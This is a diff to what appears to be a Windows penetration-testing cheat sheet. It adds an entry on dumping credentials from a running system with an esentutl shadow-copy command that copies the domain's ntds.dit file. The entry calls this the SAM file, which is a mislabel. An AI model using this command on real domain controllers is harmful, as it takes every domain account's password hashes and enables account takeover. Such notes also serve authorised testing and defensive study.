@@ -82,4 +82,7 @@
 * Default domain password policy check
 -> Net accounts /domain
 
+* How to dump the Windows SAM file while the system is running?
+-> esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
+
 
